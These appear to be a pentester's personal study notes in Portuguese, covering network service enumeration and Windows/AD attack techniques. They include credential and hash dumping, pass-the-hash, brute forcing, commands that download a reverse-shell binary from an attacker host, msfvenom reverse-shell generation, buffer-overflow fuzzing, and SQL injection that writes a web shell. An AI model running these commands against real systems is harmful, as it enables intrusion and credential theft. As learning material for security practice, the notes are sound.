



# http
- http 1.1 requer Host no header
## aspx

enumerando versão do aspx
```
└─$ nc -v 10.10.11.14 80
Connection to 10.10.11.14 80 port [tcp/http] succeeded!
HEAD /index.aspx HTTP/1.0

HTTP/1.1 404 Not Found
Cache-Control: private
Content-Length: 1960
Content-Type: text/html; charset=utf-8
Server: Microsoft-IIS/10.0
X-AspNet-Version: 4.0.30319
X-Powered-By: ASP.NET
Date: Thu, 29 Aug 2024 19:16:34 GMT
Connection: close

```

```
└─$ nc -v 10.10.10.10 80
GET /index.aspx HTTP/1.1
Host: 10.10.10.10

HTTP/1.1 404 Not Found
Cache-Control: private
Content-Length: 1960
Content-Type: text/html; charset=utf-8
Server: Microsoft-IIS/10.0
X-AspNet-Version: 4.0.30319
X-Powered-By: ASP.NET
Date: Thu, 29 Aug 2024 19:16:34 GMT
Connection: close
```


## https (443)
porta padrão: 443
```
openssl s_client -connect www.example.com:443 -quiet
```

# Firewall
```
wafw00f example.com
```


# ftp (21)
O FTP permite o envio e recebimento de arquivos.
Em alguns casos o ftp permite o login apenas com o usuário e senha vazia.
O firewall tende a ser menos restritivo com o modo passivo
```
ftp 192.168.0.8 -P 21

ftp USER@HOST PORT
```
comandos úteis:
1. more teste := abre o arquivo teste
2. dir
	Descrição: lista os arquivos do diretório.
3. get
	Descrição: Baixa um arquivo do servidor FTP para o diretório local.
4. mget
	Descrição: Baixa múltiplos arquivos do servidor FTP para o diretório local.
5. put
	Descrição: Envia um arquivo do diretório local para o servidor FTP.
5. mput
	Descrição: Envia múltiplos arquivos do diretório local para o servidor FTP.

## ftp (passivo x ativo)
referencial é o servidor
- No modo FTP passivo o servidor fica escutando enquanto aguarda a conexão do cliente. 
- No modo FTP ativo, o cliente fica escutando enquanto aguarda a conexão do servidor.

Modo Passivo:
    No modo passivo, o cliente estabelece tanto a conexão de controle (porta 21) quanto a conexão de dados. Após estabelecer a conexão de controle, o cliente solicita ao servidor uma porta para a conexão de dados. O servidor então informa ao cliente qual porta ele (o servidor) está escutando para a conexão de dados (geralmente uma porta acima de 1023). O cliente, então, abre uma conexão para essa porta no servidor.

Modo Ativo:
    No modo ativo, o cliente estabelece a conexão de controle com o servidor na porta 21. Quando é necessário transferir dados, o cliente informa ao servidor qual porta ele (o cliente) está escutando para a conexão de dados (normalmente uma porta acima de 1023). O servidor então abre uma conexão a partir de sua porta 20 para a porta especificada pelo cliente.



# NetBios (139/tcp)   / SMB (445/tcp)
Permite o compartilhamento de arquivos/diretórios na rede.


NetBios (porta 139) --> antigo
SMB (porta 445) --> mais recente

protocolos aceitos pelo SMB
```
nmap --script smb-protocols -p 445 10.10.11.35 -Pn
PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-protocols: 
|   dialects: 
|     2.02
|     2.10
|     3.00
|     3.02
|_    3.11

```

estabelece conexão passando usuário e senha
```
smbclient  \\\\10.10.11.35\\SYSVOL\\ -U "user%pass" 
```

```
smbclient \\\\172.30.0.103\\Utils$\\ -U dev01%dev0105 --workgroup=SRV01
```

lista os diretórios compartilhados (`--workgroup`)
```
smbclient -L \\\\10.10.11.35
smbclient -L \\\\10.10.11.35 --workgroup cicada.htb
Password for [WORKGROUP\user]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	DEV             Disk      
	HR              Disk      
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 

```

lista usando protocolo v2 e v3:
```
smbclient -L \\10.10.11.35 -N -m SMB2
smbclient -L \\10.10.11.35 -N -m SMB3
```


Identifica hosts e informações de NetBIOS em uma rede (classe C)
```
sudo nbtscan 192.168.0.0/24

192.168.0.1    <00> UNIQUE   "MYPC"       [MYGROUP]
192.168.0.2    <00> UNIQUE   "ANOTHERTPC" [MYGROUP]
192.168.0.3    <00> UNIQUE   "SERVER"     [MYGROUP]

```

Em alguns casos o netbios/smb permite o login apenas com o usuário e senha vazia.
```
smbclient \\hostname/sharename -U username%
```
- `%` indica que a senha está em branco.


conectando ao servidor com null session
```
smbclient -L \\192.168.0.8 --option='client min protocol=NT1' -N
```

conectando ao servidor smb com usuario
```
smbclient -L \\192.168.0.8 --option='client min protocol=NT1' -U admin%admin123
```
- **`-L \\192.168.0.8`**: Lista os compartilhamentos disponíveis no servidor SMB especificado pelo endereço IP `192.168.0.8`.
- **`--option='client min protocol=NT1'`**: Define a opção para usar o protocolo SMBv1 (NT1), necessário para compatibilidade com sistemas que não suportam protocolos mais recentes.
- **`-U admin%admin123`**: Fornece as credenciais de login para autenticação. O formato `user%password` é usado para passar o nome de usuário e a senha diretamente na linha de comando.


Comandos Úteis:
ls
	Descrição: Lista os arquivos e diretórios no diretório atual do servidor SMB.
get
	Descrição: Baixa um arquivo do servidor SMB para o diretório local.
mget
	Descrição: Baixa múltiplos arquivos do servidor SMB para o diretório local.
put
	Descrição: Envia um arquivo do diretório local para o servidor SMB.
mput
	Descrição: Envia múltiplos arquivos do diretório local para o servidor SMB.
del
	Descrição: Exclui um arquivo no servidor SMB.
rmdir
	Descrição: Remove um diretório no servidor SMB.
mkdir
	Descrição: Cria um novo diretório no servidor SMB.
pwd
	Descrição: Exibe o diretório de trabalho atual no servidor SMB.
stat
	Descrição: Mostra informações detalhadas sobre um arquivo ou diretório.
exit ou quit

## via windows
**ex nbtstat**
serve para identificar informações do host
```
nbtstat -A 192.168.1.1
```

**Flags importantes:**
- **`-a <NomeRemoto>`**: Exibe a tabela de nomes NetBIOS de um computador remoto, especificado pelo nome.
    
- **`-A <EndereçoIP>`**: Exibe a tabela de nomes NetBIOS de um computador remoto, especificado pelo endereço IP.
    
- **`-c`**: Exibe o conteúdo do cache da tabela de nomes NetBIOS, mostrando os nomes que foram recentemente resolvidos para endereços IP.
    
- **`-n`**: Exibe a tabela de nomes NetBIOS local. Esta tabela contém os nomes NetBIOS registrados no computador local.
    
- **`-r`**: Exibe as estatísticas de resolução de nomes, mostrando quantos nomes foram resolvidos através de broadcast e quantos foram resolvidos via WINS (Windows Internet Name Service).
    
- **`-R`**: Limpa e recarrega a tabela de nomes remotos do cache de nomes NetBIOS.
    
- **`-S`**: Exibe as sessões abertas com seus endereços IP associados.
    
- **`-s`**: Similar ao `-S`, mas resolve os endereços IP para nomes de host, se possível.


**net view**
serve para visualizarmos se o host oferece um serviço de compartilhamento
```
net view \\192.168.1.1

Nome do Servidor     Comentário
-------------------------------------------------------------------------------
\\COMPUTADOR1        Compartilhamento de arquivos e impressoras
\\COMPUTADOR2        Compartilhamento de documentos


```

**net use**
serve para estabelecer uma conexão com o host

ex com null session
```
net use \\192.168.1.1 "" /u:""
```

ex com usuário e senha
```
net use \\192.168.1.1 "senha" /u:"usuario"
```

ex com diretório
```
net use Z: \\192.168.1.1\opt
```
obs: `Z` Especifica a letra da unidade de rede que você deseja usar para mapear o recurso compartilhado. Poderia ser qualquer letra que não estiver sendo utilizada

Para excluir basta utilizar o comando
```
net use Z: /delete
```

# rpc (Remote Procedure Call)  135/tcp
O RPC é uma API que permite a um programa executar um procedimento (ou função) em outro espaço de endereço, como em um servidor remoto, como se fosse uma chamada local
conectando ao servidor com usuário e senha
```
rpcclient -U <username>%<password> <hostname_or_ip>
```
conectando ao servidor via Null Session
```
rpcclient -U "" -N <hostname_or_ip>
```

**Comando help**
```
rpcclient $> ?
```

**Enumerar Usuários**
```
rpcclient $> enumdomusers
```
Este comando lista todos os usuários do domínio.

**Enumerar Grupos:**
```
rpcclient $> enumdomgroups
```
Este comando lista todos os grupos do domínio.

**Obter Informações de um Usuário Específico:**
```
rpcclient $> queryuser <username>
```
Substitua `<username>` pelo nome do usuário para obter informações sobre esse usuário.

**Listar Compartilhamentos**:
```
rpcclient $> netshare
```

```
rpcclient $> netshareenum
```

```
rpcclient $> netshareenumall
```
Estes comandos listam os compartilhamentos disponíveis no servidor.
Obs: O comando `netshare` mostra menos informações que o `netshareenum`, que por sua vez mostra menos informações do `netshareenumall`.

**Verificar o Status do Servidor**:
```
rpcclient $> srvinfo
```
Este comando fornece informações sobre o servidor, como versão e nome.
# pop3 (110)
serviço de email
porta padrão: 110

Inicia conexão:
```
telnet <ip> <porta>
```

Login:
```
user admin
pass admin123
```

Em alguns casos o netbios/smb permite o login apenas com o usuário e senha vazia.
```
USER username
PASS
```

Comandos úteis:
1. TOP \[message index\] \[num lines to return\]

# SMTP
O SMTP (Simple Mail Transfer Protocol) é um protocolo de comunicação utilizado para enviar e transferir e-mails entre servidores de e-mail e clientes.
**porta default: 25**
```
nc -v <ip> <porta>
```

ex de resposta quando o usuário existe
```
EHLO root
250 2.1.5 OK
```

ex de resposta quando o usuário não existe
```
EHLO jhayson
550 5.1.1 User unknown
```

ex de resposta quando o usuário existe
```
VRFY root
250 2.1.5 OK
```

```
VRFY www-data
250 2.1.5 OK
```

ex de resposta quando o usuário não existe
```
VRFY jhayson
550 5.1.1 User unknown
```

obs: podemos enviar um email para um determinador usuário para enumerar se o usuário em questão existe ou não. De acordo com a resposta recebida podemos definir se o usuário existe ou não.

# Enumerando Dispositivos de Rede
porta default: 23

ex de dispositivos de rede firewall, routers e switchs
uma vez que identificamos o modelo do dispositivo, podemos consultar o manual do fabricante, podemos realizar login telnet com as credenciais default.

sites para consulta de credenciais default:
1. https://cirt.net/passwords
2. https://datarecovery.com/rd/default-passwords/

conexão com o servidor
```
telnet <ip> <porta>
```

# ssh (secure shell)
Permite conexão de shell remota
Portas default: 22, 2222, 22222

Estrutura comum de um diretório `.ssh`:
```
~/.ssh/
├── authorized_keys
├── id_rsa
├── id_rsa.pub
├── id_ecdsa
├── id_ecdsa.pub
├── id_ed25519
├── id_ed25519.pub
├── id_dsa
├── id_dsa.pub
├── known_hosts
├── config
├── ssh_config
└── ssh_known_hosts

```

ex de banner grabbing
```
nc <IP>
```

Métodos de autenticação:
```
ssh -v root@192.168.0.8

Authentications that can continue: publickey,password
```

## Autenticação com chave pública
basta adicionar a nossa chave pública no arquivo `authorized_keys`

gerando par de chave público/privada
```
ssh-keygen
id_rsa  id_rsa.pub
```
- `id_rsa` é a chave privada
- `id_rsa.pub` é a chave pública

## Arquivo de configuração
path `/etc/ssh/sshd_config`

alterando a porta default:
antes
```
#   Port 22
```

depois
```
#   Port 22
```

Login de root via ssh:
Nem sempre é permitido logar com root via ssh

antes
```
PermitRootLogin no
```
https://www.veerotech.net/kb/how-to-disable-ssh-login-for-root-user/

depois
```
PermitRootLogin yes
```
https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/6/html/v2v_guide/preparation_before_the_p2v_migration-enable_root_login_over_ssh


# SNMP
Protocolo para gerenciamento de dispostivos de rede, encontrado em switchs, roteadores e servidores.
porta default: 161 (UDP)

OID (Object identifier): 

site para mapear o OID: 
http://www.oid-info.com/
https://www.alvestrand.no/objectid/1.3.6.1.2.1.1.html

MIB (Management Information Base):

**Community:** Community em SNMP é um tipo de "senha" usada para controlar o acesso aos dispositivos gerenciados. Ele serve como um mecanismo básico de autenticação, especialmente nas versões SNMPv1 e SNMPv2c.
Dica: podemos pesquisar por communities padrões no manual do fabricante.

**Enumerando SNMP:**
```
nmap -sVU -p161 -Pn <IP>
```

Programa para mapear as communities de um host
```
onesixtyone -c community.txt 192.168.0.1/24
```

## snmpwalk
snmpwalk é um utilitário para interagir com o protocolo SNMP

exemplos de uso:
```
# Enumerating the Entire MIB Tree
> snmpwalk  -c public -v1 192.168.11.219

# Enumerating Windows Users:
> snmpwalk -c public -v1 192.168.11.204 1.3.6.1.4.1.77.1.2.25

# Enumerating Running Windows Processes:
> snmpwalk -c public -v1 192.168.11.204 1.3.6.1.2.1.25.4.2.1.2

# Enumerating Open TCP Ports:
> snmpwalk -c public -v1 192.168.11.204 1.3.6.1.2.1.6.13.1.3

# Enumerating Installed Software:
> snmpwalk -c public v1 192.168.11.204 1.3.6.1.2.1.25.6.3.1.2
```
https://github.com/SofianeHamlaoui/Lockdoor-Framework/blob/master/ToolsResources/INFO-GATH/CHEATSHEETS/snmb_enumeration.md

## snmptranslate
O snmp converte OIDs para MIB e MIB para OIDs, ou seja, permite a conversão bidirecional entre OIDs (Object Identifiers) numéricos e seus nomes de texto descritivos dentro da MIB (Management Information Base)

pesquisa por uma função
```
snmptranslate -Td
```

```
snmptranslate -Td -On system.sysUpTime
```
- **`-Td`**: Mostra uma descrição detalhada do OID.
- **`-On`**: Exibe a versão numérica do OID.

Em alguns casos é necessário baixar um tradutor desses OIDs
```
apt search mibs
snmp-mibs-downloader/jammy,jammy 1.5 all
  install and manage Management Information Base (MIB) files

```
Instala o pacote
```
sudo apt install snmp-mibs-downloader
```

cria o arquivo de configuração
```
echo "" > /etc/snmp/snmp.conf
```


# mysql
porta default: 3306

testar credenciais default

conexão com o servidor (senha nula) e usuário mysql/root
```
mysql -h 192.168.0.5 -u mysql
mysql -h 192.168.0.5 -u root
```

```
mysql -u <username> -p -h <hostname> -P <port> <database>
```

# wordpress
```
wpscan --url http://blog.thm --enumerate ap,at,dbe,cb,u --detection-mode aggressive
```
Command Breakdown:
- ap = All Plugins
- at = All Themes
- dbe = Database Exports
- cb = Config Backups
- u = Enumerate Users
- Detection-Mode = Since we’re not worried about being detected we can use aggressive mode which occasionally delivers more results at the cost of generating more noise.

bruteforce de senhas com `XML-RPC` 
```
wpscan --url http://blog.thm/ --usernames kwheel,bjoel --passwords ~/wordlist/rockyou.txt
```
http://blog.thm/xmlrpc.php
	XML-RPC server accepts POST requests only.


arquivo de configuração:
contem informações úteis do banco de dados
```
cat wp-config.php


// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'blog');


/** MySQL database username */
define('DB_USER', 'wordpressuser');

/** MySQL database password */
define('DB_PASSWORD', 'LittleYellowLamp90!@');

```

# msfconsole
```
search eternalblue
```

create a workspace
```
workspace -a desec
```

switch to workspace
```
workspace desec
```

nmap and store results
```
db_nmap -sC -sV -v -Pn <IP>
```

show previous hosts
```
hosts
```

consult previous nmap results
```
services
services 172.30.0.103
```

# windows
**enumerar versão**
```
systeminfo
```

**Obtaining AD users’ hashes or local hashes:**
```
vssadmin create shadow /for=C:
copy <shadow-volume>\Windows\NTDS\ntds.dit <ntds>
copy <shadow-volume>\Windows\system32\config\system <system>
copy <shadow-volume>\Windows\system32\config\sam <sam>

impacket-secretsdump -ntds <ntds> -system <system> LOCAL
impacket-secretsdump <user>:<pass>@<host>
```

**Capturing hashes by registry:**
```
reg save hklm\sam <name>
reg save hklm\system <name>
impacket-secretsdump -sam <sam> -system <system> LOCAL
```

**versões de hash no windows (mais antigos pro mais recentes)**
- LM (geralmente termina com `EE`, se  começar com `AA` e terminar com `EE` está em desuso)
- NTLM = NTLM V1
- NTLM V2


**Path for hashes:**
```
C:\Windows\system32\config\SAM                        usuarios windows 7,8,10,11
C:\Windows\system32\NTDS\ntds.dit                    usuarios do windows server
C:\Windows\system32\config\SYSTEM                 usuarios windows 7,8,10,11
```

Bypass User Account Control (UAC):
```
exploit/windows/local/bypassuac_fodhelper
exploit/windows/local/ask (exige interação com usuário)
```

windows antigo , testar eternalblue:
```
exploit/windows/smb/ms17_010_psexec
exploit/windows/smb/ms17_010_eternalblue
```

## Cracking hashes (hashdump)
john
```
john --format=lm --wordlist=<wordlist> <hashfile>
john --format=nt --wordlist=<wordlist> <hashfile>
```

**hashcat NT/NTLM**

Para quebrar usando hashcat preciso formatar as hashes do hashdump para o formato adequado

```
# hashes não formatadas
ADM01:1009:aad3b435b51404eeaad3b435b51404ee:25c22286c527ef085b2541e97c740587:::
Administrator:500:aad3b435b51404eeaad3b435b51404ee:b1f233b4583731263d8c54659889dc0a:::
CPD01:1006:aad3b435b51404eeaad3b435b51404ee:9b6f9e9dd57c57c4f6ff2a5e8c819cdc:::
DEV01:1007:aad3b435b51404eeaad3b435b51404ee:5288d36e2a539296875b393aa763bfcc:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
USER01:1008:aad3b435b51404eeaad3b435b51404ee:9e40973e2cb458449cb1ce3f4a2a2d6b:::


# hash formatadas
25c22286c527ef085b2541e97c740587
b1f233b4583731263d8c54659889dc0a
9b6f9e9dd57c57c4f6ff2a5e8c819cdc
5288d36e2a539296875b393aa763bfcc
31d6cfe0d16ae931b73c59d7e0c089c0
9e40973e2cb458449cb1ce3f4a2a2d6b
```

quebra da hash nt usando hashcat
```
hashcat -m 1000 hash_formatada.txt WORDLIST
```


**hashes da RAM:**
```
/usr/share/windows-resources/wce/wce-universal.exe
/usr/share/windows-binaries/fgdump/fgdump.exe
```

mimikatz para pegar credenciais
```
wdigest
```

## obtendo shell/ validando usuário
validando credenciais:
```
winexe -U USER%PASS //HOST cmd.exe
```

```
sudo crackmapexec smb hosts.txt -d cicada.htb -u <USER> -p <PASS>
```

```
exploit/windows/smb/psexec

Em alguns casos vai ter que mudar o target para conseguir shell
    Id  Name
    --  ----
=>  0   Automatic
    1   PowerShell
    2   Native upload
    3   MOF upload
    4   Command

```

```
pth-winexe -U bernardo%HASH //HOST cmd.exe
```

```
responder -I <interface> -Pbv
```

ntlmv2 (hashcat 5600 e john netntlmv2)
```
hashcat -m 5600 HASH.txt WORDLIST 
john --format=netntlmv2 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

**dcc2 (hashcat 2100 e john mscash2)**
```
hashcat -m 2100 HASH.txt WORDLIST
john --format=mscash2 hash_secretdump --wordlist=~/wordlist/rockyou.txt

hash formatada:
$DCC2$10240#thenrique#bffd65356630d9a479f8e6761f56393d
```
note que a hash precisa estar corretamente formatada


obtendo hashes a partir de um usuário validado
```
impacket-secretsdump DOMAIN/USER:PASS@HOST
```

formatando hash do impacket-secretdump
```
hash capturada:
ORIONSCORP2.LOCAL/thenrique:$DCC2$10240#thenrique#bffd65356630d9a479f8e6761f56393d:

hash formatada:
$DCC2$10240#thenrique#bffd65356630d9a479f8e6761f56393d
```

**Habilitando RDP com credenciais validadas:**
```
crackmapexec smb HOST -u USER -p PASS -M rdp
```

## enumeração de usuários do dóminio (AD)
```
rpcclient -W WORKGROUP -U USER HOST
```

enumera os usuarios do dominio
```
rpcclient $> enumdomusers
user:[Administrador] rid:[0x1f4]
user:[Convidado] rid:[0x1f5]
user:[DefaultAccount] rid:[0x1f7]
user:[Usuario] rid:[0x3e9]
user:[WDAGUtilityAccount] rid:[0x1f8]
```

enumera os grupos do dominio
```
rpcclient $> enumdomgroups 
group:[None] rid:[0x201]
```

enumera os membros de um grupo
```
rpcclient $> querygroupmem 0x201
        rid:[0x1f4] attr:[0x7]
        rid:[0x1f5] attr:[0x7]
        rid:[0x1f7] attr:[0x7]
        rid:[0x1f8] attr:[0x7]
        rid:[0x3e9] attr:[0x7]

```

query pra usuario WDAGUtilityAccount
```
queryuser 0x1f8
```

lista os comandos
```
rpcclient $> help
```
## enumeração de usuários
**enumerar usuários locais**
```
net user

User accounts for \\EC2AMAZ-I8UHO76

-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest
Jenny                    John
The command completed successfully.
```

**powershell, enumerar usuários locais**
```
Get-LocalUser

Name           Enabled Description
----           ------- -----------
Administrator  True    Built-in account for administering the computer/domain
DefaultAccount False   A user account managed by the system.
Guest          True    Built-in account for guest access to the computer/domain
Jenny          True
John           True
```
obs: a coluna **`Enabled`** indica se a conta de usuário local está ativa (habilitada) ou desativada.

powershell, enumerar usuários locais com permissão de administradores:
```
Get-LocalGroupMember -Group "Administrators"

ObjectClass Name                          PrincipalSource
----------- ----                          ---------------
User        EC2AMAZ-I8UHO76\Administrator Local
User        EC2AMAZ-I8UHO76\Guest         Local
User        EC2AMAZ-I8UHO76\Jenny         Local
```

**enumerar privilégios de usuário**
```
whoami /priv
whoami /all
```

# Active Directory (AD)

## hashes na rede
arquivo de configuração
```
/etc/responder/Responder.conf
```
obs: altera a linha respondTo para incluir apenas os nossos hosts alvo

```
responder -I eth0 -Prv
```

## Remote Desktop Protocol (rdp port 3389)
utilitário para interagir com rdp no linux
```
xfreerdp
xfreerdp /v:<IP_do_host> /u:<nome_do_usuário> /p:<senha>
xfreerdp /v:10.10.39.3 /u:Administrator /p:letmein123!
```


# powershell
transferencia do arquivo rev
```
iwr -uri http://<meu_ip>:PORT/rev.exe -outfile rev.exe
```
executar antes
```
python3 -m http.server <PORT>
```

# cmd
transferencia do arquivo rev
```
certutil.exe -urlcache -split -f "http://<meu_ip>:PORT/rev.exe"
```
executar antes
```
python3 -m http.server <PORT>
```


## login
loggin bem sucedido
```
wevtutil qe Security "/q:*[System[EventID=4624]]" /f:text /c:10
```


login bem sucedidos filtrando pelo nome de usuário
```
wevtutil qe Security "/q:*[System[EventID=4624] and EventData[Data[@Name='TargetUserName']='john']]" /f:text /c:10
```
- `/q:*[System[EventID=4624]]`: Filtra eventos com ID 4624.
- `EventData[Data[@Name='TargetUserName']='john']`: Dentro dos dados do evento, filtra onde o nome do usuário é "john".
obs: caso a saida do comando acima seja nula, o usuário não fez login bem sucedido


loggin bem sucedido com usuário john em ordem anti-cronologica (mais recente pro mais antigo)
```
wevtutil qe Security "/q:*[System[EventID=4624] and EventData[Data[@Name='TargetUserName']='john']]" /f:text /c:10 /rd:true
```
- **`qe Security`**: Consulta o log de eventos de segurança.
- **`"/q:*[System[EventID=4624]]"`**: Filtra os eventos de logon bem-sucedido (ID 4624).
- **`/f:text`**: Formato de saída em texto.
- **`/rd:true`**: Inverte a ordem dos eventos, mostrando os mais recentes primeiro.

**Formato das datas:**
```
YYYY-MM-DDTHH:MM:SS.sss 
2019-03-02T17:48:32.199 

ano = 2019 
mes = 03
dia = 02
hora = 17
minuto = 48
segundo = 32
milissegundo = 199
```


# Hydra
bruteforce de serviços, ssh,ftp

ex ftp:
```
hydra -L users.txt -P pass.txt 192.168.0.8 ftp -s 21 
```

ex ssh:
```
hydra -L users.txt -P pass.txt 192.168.0.8 ssh -t 4 -s 22
```
Obs: no ssh é preciso limitar a quantidade de requisições paralelas usando `-t 4`

```
hydra -v -l <user> -p <pass> -M <targets> <protocol> 
hydra -v -L <user_list> -P <pass_list> <protocol>://<ip>:<port> 
```

**Flags úteis:**
-s PORT: porta do serviço
-L: path para lista de usuários
-P: path para lista de senhas
-C: path para arquivo no formato "login:pass"
-l: usuário em texto
-p: senha em texto
-s PORT
-W TIME
        defines a wait time between each connection a task performs. This usually only makes sense if a low task number is used, .e.g -t 1


# cewl
pesquisar por uma string em um site
```
cewl URL -m LENGTH
```
-m, --min_word_length
                     Minimum word length, default 3.

# hashcat

```
hashcat -m <hash_type> <hash_file> <wordlist>
```

listar exemplos de hashes:
```
hashcat --example-hashes
```

hashcat para identificar a hash
```
hashcat --identify aba63f26d5947a558d4fdbbbe4468965710520540ef3d48e0b3cbf79d6cba217
```

# john
john para transformar um zip com senha em uma hash
```
zip2john ~/Downloads/files.zip > hash.txt
```

john para quebrar uma hash
```
john --wordlist=~/wordlist/rockyou.txt hash.txt
```

lista os formatos de hash
```
john --list=formats
```

## unshadow
```
unshadow passwd shadow >  hashes_formatadas
```
```
john hashes_formatadas
```

## bruteforce

```
john --wordlist=<wordlist> --rules --stdout > <output> #/etc/john/john.conf
cewl <site> -m <min-chars> 
hydra -v -l <user> -p <pass> -M <targets> <protocol> 
hydra -v -L <user_list> -P <pass_list> <protocol>://<ip>:<port> 
crunch <min> <max> -t ruhptura%^@, -o <output>
```

| %   | number       |
| --- | ------------ |
| ^   | special char |
| @   | lowercase    |
| ,   | uppercase    |

# wget
para baixar todo conteudo de uma página
```
wget -m <URL>
```

# grep
buscar uma string em todo o sistema
```
grep -ri "desec" /caminho/do/diretorio 2>/dev/null
```
# ritual
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
CTRL+Z
stty raw -echo
fg
export TERM=xterm
```

# identificar hashes
hashid
# vim
```
:w !sudo tee /path/to/file/arquivo
```

# enum4linux
```
enum4linux -a 172.16.1.107
```
# crackmapexec
```
crackmapexec smb <hosts> -u <user> -p <pass> [-x <cmd>]
```

```
sudo crackmapexec smb 10.10.11.35 -d cicada.htb -u @users.txt -p '' --shares
```

validando credenciais:
```
sudo crackmapexec smb hosts.txt -d cicada.htb -u <USER> -p <PASS>
```



## Relative Identifier (RID)
O RID é a parte final de um **SID (Security Identifier)**, que identifica de forma exclusiva contas de usuários, grupos ou outros objetos de segurança
RIDs Comuns em Sistemas Windows

Estrutura do SID e o Papel do RID
```
S-1-5-21-XXXXXXXXX-XXXXXXXXX-XXXXXXXXX-RID
```
- `S-1-5`: Identificador padrão do Windows.
- `21-XXXXXXXXX-XXXXXXXXX-XXXXXXXXX`: Porção única associada ao domínio ou computador. É chamado de **SID base**.
- RID: Identificador específico que diferencia contas, grupos ou outros objetos dentro do mesmo domínio ou sistema.


Um **SID** típico segue o formato:

|**RID**|**Descrição**|
|---|---|
|**500**|Administrador|
|**501**|Convidado|
|**512**|Grupo Administradores do Domínio|
|**513**|Grupo Usuários do Domínio|
|**1000+**|Contas de usuários criadas manualmente|
bruteforce de RID
```
crackmapexec smb 10.10.11.35 -u guest -p '' -d cicada.htb --shares --rid-brute
```


# low level

## windows
Compiling ASM code on Windows:

```powershell
nasm -f win32 <file.nasm>
golink [/console] /entry _main [<dll>] [/mix]
```

Example code using Windows API:
```
extern MessageBoxA
global _main

section .data
	ttitle db 'Get Rekt',0
	ttext db 'Lorem ipsum',0

section .text
_main:
	push 1
	push ttitle
	push ttext
	push 0
	call MessageBoxA
```

## linux
- syscalls - https://syscalls.w3challs.com/
Compiling ASM code on Linux:
```
nasm -f elf32 <file.nasm>
ld -entry _main [-m elf_i386] <file.o> -o <out>
```

using a syscall example
```
global _main
section .data
	msg db 'Hello Bitch',0xa

section .text
_main:
	mov rax, 1 ;write
	mov rdi, 1 ;stdout
	mov rsi, msg
	mov rdx, 12
	syscall
	
	mov rax, 0x3c ;exit
	mov rdi, 0 ;status code
	syscall
```


monitorando syscalls
```
strace ./teste
```
### gdb
adiciona breakpoint
```
breakpoint <_section> 
```
remove todos os breakpoints
```
delete breakpoints 
```
remove breakpoint específico
```
info break
del <num_breakpoint>

```
informações dos registradores|funções
```
info <register|functions>
```
step into
```
si
```
realiza o disassembly
```
disas
```
trocar a syntax da at&t para intel no gdb
```
set disassembly-flavor intel
```
visualizar conteudo de endereço de memória
```
x/s 0x402000
```

#### gdb tui
gdb com interface
```
gdb ./teste -tui
```

mostra as informações dos registradores/assembly no layout
```
layout <asm|regs>
```


## buffer overflow

passos para conseguir uma shell com BOF
1. descobrir se o programa é vulneravel a BOF
2. encontrar a quantidade certa de bytes para atingir EIP
3. testar o controle do EIP
4. testar bad characters (bad chars)
5. encontra um bom endereço de retorno
6. gerar shellcode
7. conseguir shell

Em C procurar por funções `scanf`, `gets` e `strcpy`

**shellcode**
1. coleta de informações (identificar o software e entender como funciona a comunicação)
2. fuzzing (enviar diversos tipos de dados a fim de testar o comportamento do software)
3. identificar a vulnerabilidade (atingir EIP)
4. controlar EIP (validar espaços)
5. identificar badchars
6. identificar o endereço de retorno
7. testar a execução
8. gerar shellcode
9. exploit final



**offset**
**busca manual:** fazemos um "busca binária", testando quantos bytes precisamos enviar para que a aplicação pare de funcionar

**busca automatizada:**  
```
/usr/bin/msf-pattern_create -l <length> 
/usr/bin/msf-pattern_offset -l <length> -q <4_bytes_HEX> # hex sem o 0x

# exemplo particular
/usr/bin/msf-pattern_create -l 2200 # gera payload de 2200 bytes
/usr/bin/msf-pattern_offset -l 2200 -q 43396f43 # 43396f43 são os dados que crasharam o programa
```


**payload**
Overwrite the return address with a “jmp rsp” (specially if any library doesn’t have ASLR), and then overwrite the RSP space, which comes right after the return in the stack, with some nopsledges and the shell code.
Shell code generation:
```
msfvenom -p windows/shell_reverse_tcp lhost=<ip> lport=<port> exitfunc=thread -b <badchars|'\0x00'> -f <c|python>
```

## DEP (data execution prevention)

## ASLR (address space layout randomization)

# python
estabelecer conexão com servidor:
```
#!/usr/bin/python
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.0.5", 5800))
banner = s.recv(1024)
print(banner)
s.send("help\r\n")
s.recv(1024)
```

fuzzing:
```
#!/usr/bin/python
import socket
lista = ["A"]
contador = 100

while len(lista) <= 50:
	lista.append("A"*contador)
	contador = contador+100

for dados in lista:
	print(f"Fuzzing com send {len(dados)}")
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(("192.168.0.5", 5800))
	banner = s.recv(1024)
	s.send("SEND "+dados+"\r\n")
```


# exploits públicos
```
searchsploit <search> [--exclude="phpMy|Dans"] [--id]
```

baixando exploit pelo ID
```
searchsploit ipfire --id -m <exploit_ID>
```


# web


## SQL
**comandos SQL**
loga no banco de dados
```
sudo mysql -u root -p
```
inicia o serviço do banco de dados
```
sudo systemctl start mysql # inicia
sudo systemctl status mysql # status
```
auto start sql
```
sudo systemctl disable mysql
systemctl is-enabled mysql
```
mostra os bancos de dados
```
show databases;
```
exibe o usuário que estamos conectados
```
select user();
```
exibe o banco de dados que estamos conectados
```
select database();
```

obs: no banco mysql na tabela user tem mapeados usuário e senha dos usuários mysql

retorna mais de um campo em apenas 1 consulta, separando os campos por `:`
```
select concat(login,':', senha) from usuarios;
```
leitura de arquivo
```
select load_file('/var/www/html/index.html');
```
sleep
```
select sleep(10);
```
describe
```
describe <table_name>;
```

### SQL injection
**error based** 
```
'
\
"
```

Leitura de arquivo no servidor
```
select * from usuarios where login='' union select 1,2,LOAD_FILE('/var/www/html/payload.php');
```

Escrita de arquivo no servidor:
```
select * from usuarios where login='' union select 1,2,'PAYLOAD' INTO OUTFILE '/var/www/html/payload.php';

